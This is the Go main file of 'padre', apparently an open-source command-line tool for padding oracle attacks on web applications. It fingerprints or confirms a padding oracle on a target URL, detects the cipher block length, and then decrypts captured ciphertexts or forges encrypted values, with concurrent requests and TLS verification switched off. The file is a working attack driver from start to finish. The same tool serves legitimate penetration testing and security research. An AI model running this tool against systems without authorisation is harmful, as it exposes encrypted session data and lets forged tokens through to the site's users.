package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"

	"github.com/glebarez/padre/pkg/client"
	"github.com/glebarez/padre/pkg/color"
	"github.com/glebarez/padre/pkg/encoder"
	"github.com/glebarez/padre/pkg/exploit"
	out "github.com/glebarez/padre/pkg/output"
	"github.com/glebarez/padre/pkg/probe"
	"github.com/glebarez/padre/pkg/util"
)

var (
	stderr = color.Error
	stdout = os.Stdout
)

func main() {
	var err error

	// initialize printer
	print := &out.Printer{
		Stream: stderr,
	}

	// determine terminal width
	var termWidth int
	termWidth, err = util.TerminalWidth()
	if err != nil {
		// fallback to default
		print.AvailableWidth = defaultTerminalWidth
		print.Errorf("Could not determine terminal width. Falling back to %d", defaultTerminalWidth)
		err = nil //nolint
	} else {
		print.AvailableWidth = termWidth
	}

	// parse CLI arguments
	args, errs := parseArgs()

	// check if errors occurred during CLI arguments parsing
	if len(errs.errors) > 0 {
		print.AddPrefix(color.CyanBold("argument errors:"), true)
		for _, e := range errs.errors {
			print.Error(e)
		}
		print.RemovePrefix()
		print.Printlnf("Run with %s option to see usage help", color.CyanBold("-h"))
		os.Exit(1)
	}

	// check if warnings occurred during CLI arguments parsing
	for _, w := range errs.warnings {
		print.Warning(w)
	}

	// show welcoming message
	print.Info("%s is on duty", color.CyanBold("padre"))

	// be verbose about concurrency
	print.Info("using concurrency (http connections): %s", color.Green(*args.Parallel))

	// initialize HTTP client
	client := &client.Client{
		HTTPclient: &http.Client{
			Transport: &http.Transport{
				MaxConnsPerHost: *args.Parallel,
				Proxy:           http.ProxyURL(args.ProxyURL),
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip TLS verification
			}},
		URL:               *args.TargetURL,
		POSTdata:          *args.POSTdata,
		Cookies:           args.Cookies,
		CipherPlaceholder: `$`,
		Encoder:           args.Encoder,
		Concurrency:       *args.Parallel,
		ContentType:       *args.ContentType,
	}

	// create matcher for padding error
	var matcher probe.PaddingErrorMatcher

	if *args.PaddingErrorPattern != "" {
		matcher, err = probe.NewMatcherByRegexp(*args.PaddingErrorPattern)
		if err != nil {
			print.Error(err)
			os.Exit(1)
		}
	}

	// -- detect/confirm padding oracle
	// set block lengths to try
	var blockLengths []int

	if *args.BlockLen == 0 {
		// no block length explicitly provided, we need to try all supported lengths
		blockLengths = []int{8, 16, 32}
	} else {
		blockLengths = []int{*args.BlockLen}
	}

	var i, bl int
	// if matcher was already created due to explicit pattern provided in args
	// we need to just confirm the existence of padding oracle
	if matcher != nil {
		print.Action("confirming padding oracle...")
		for i, bl = range blockLengths {
			confirmed, err := probe.ConfirmPaddingOracle(client, matcher, bl)
			if err != nil {
				print.Error(err)
				os.Exit(1)
			}

			// exit as soon as padding oracle is confirmed
			if confirmed {
				print.Success("padding oracle confirmed")
				break
			}

			// on last iteration, getting here means confirming failed
			if i == len(blockLengths)-1 {
				print.Errorf("padding oracle was not confirmed")
				printHints(print, makeDetectionHints(args))
				os.Exit(1)
			}
		}
	}

	// if matcher was not created (e.g. pattern was not provided in CLI args)
	// then we need to auto-detect the fingerprint of padding oracle
	if matcher == nil {
		print.Action("fingerprinting HTTP responses for padding oracle...")
		for i, bl = range blockLengths {
			matcher, err = probe.DetectPaddingErrorFingerprint(client, bl)
			if err != nil {
				print.Error(err)
				os.Exit(1)
			}

			// exit as soon as fingerprint is detected
			if matcher != nil {
				print.Success("successfully detected padding oracle")
				break
			}

			// on last iteration, getting here means confirming failed
			if i == len(blockLengths)-1 {
				print.Errorf("could not auto-detect padding oracle fingerprint")
				printHints(print, makeDetectionHints(args))
				os.Exit(1)
			}
		}
	}

	// set block length if it was auto-detected
	if *args.BlockLen == 0 {
		*args.BlockLen = bl
		print.Success("detected block length: %s", color.Green(bl))
	}

	// print mode used
	if *args.EncryptMode {
		print.Warning("mode: %s", color.CyanBold("encrypt"))
	} else {
		print.Warning("mode: %s", color.CyanBold("decrypt"))
	}

	// build list of inputs to process
	inputs := make([]string, 0)

	if args.Input == nil {
		print.Warning("no explicit input passed, expecting input from stdin...")
		// read inputs from stdin
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			inputs = append(inputs, scanner.Text())
		}
	} else {
		// use single input, passed in CLI arguments
		inputs = append(inputs, *args.Input)
	}

	// init padre instance
	padre := &exploit.Padre{
		Client:   client,
		Matcher:  matcher,
		BlockLen: *args.BlockLen,
	}

	// process inputs one by one
	var errCount int

	for i, input := range inputs {
		// create new status bar for current input
		prefix := color.CyanBold(fmt.Sprintf("[%d/%d]", i+1, len(inputs)))
		print.AddPrefix(prefix, true)

		var (
			output []byte
			bar    *out.HackyBar
			hints  []string
		)

		// encrypt or decrypt
		if *args.EncryptMode {
			// init hacky bar
			bar = out.CreateHackyBar(args.Encoder, len(exploit.Pkcs7Pad(exploit.ApplyEscapeCharacters(input), bl))+bl, *args.EncryptMode, print)

			// provide HTTP client with event-channel, so we can count RPS
			client.RequestEventChan = bar.ChanReq

			bar.Start()
			output, err = padre.Encrypt(input, bar.ChanOutput)
			if err != nil {
				// at this stage, we already confirmed padding oracle
				// we suppose the server is blocking connections
				hints = append(hints, lowerConnections)
			}
			bar.Stop()
		} else {
			// decrypt mode
			if input == "" {
				err = fmt.Errorf("empty input")
				goto Error
			}

			// decode input into bytes
			var ciphertext []byte
			ciphertext, err = args.Encoder.DecodeString(input)
			if err != nil {
				hints = append(hints, checkInput)
				hints = append(hints, checkEncoding)
				goto Error
			}

			// init hacky bar
			bar = out.CreateHackyBar(encoder.NewASCIIencoder(), len(ciphertext)-bl, *args.EncryptMode, print)

			// provide HTTP client with event-channel, so we can count RPS
			client.RequestEventChan = bar.ChanReq

			// do decryption
			bar.Start()
			output, err = padre.Decrypt(ciphertext, bar.ChanOutput)
			bar.Stop()
			if err != nil {
				goto Error
			}
		}

		// warn about output overflow
		if bar.Overflow && util.IsTerminal(stdout) {
			print.Warning("Output was too wide to fit to you terminal. Redirect STDOUT somewhere to get full output")
		}

	Error:

		// in case of error, skip to the next input
		if err != nil {
			print.Error(err)
			errCount++
			if len(hints) > 0 {
				printHints(print, hints)
			}
			continue
		}

		// write output only if output is redirected to file or piped
		// this is because outputs already will be in status output
		// so printing them to STDOUT again is not necessary
		if !util.IsTerminal(stdout) {
			/* in case of encryption, additionally encode the produced output */
			if *args.EncryptMode {
				outputStr := args.Encoder.EncodeToString(output)
				_, err = stdout.WriteString(outputStr + "\n")
				if err != nil {
					// do not tolerate errors in output writer
					print.Error(err)
					os.Exit(1)
				}
			} else {
				stdout.Write(append(output, '\n'))
			}
		}
	}

	/* non-zero return code if all inputs were errornous */
	if len(inputs) == errCount {
		os.Exit(2)
	}
}
